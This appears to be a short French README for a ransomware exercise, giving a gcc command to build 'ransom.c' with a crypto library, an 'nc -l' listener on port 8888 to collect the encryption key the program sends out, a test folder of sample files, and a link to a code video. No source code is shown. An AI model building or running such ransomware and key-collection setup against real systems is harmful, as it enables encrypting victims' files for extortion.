# Ransomware
Pour compiler le programme: 
gcc -o ransom ransom.c ransomlib.c -lcrypto -lvlc (pour les paquets VLC)

Pour lancer un serveur qui écoute pour récupérer la clé (le numéro de port au choix)
nc -l -v -p 8888 

Le dossier "important" contient une série de dossiers et fichiers sur lesquel vous pouvez tester votre programme. 

Lien de la vidéo pour le code : https://we.tl/t-GRJ6NFXjJH
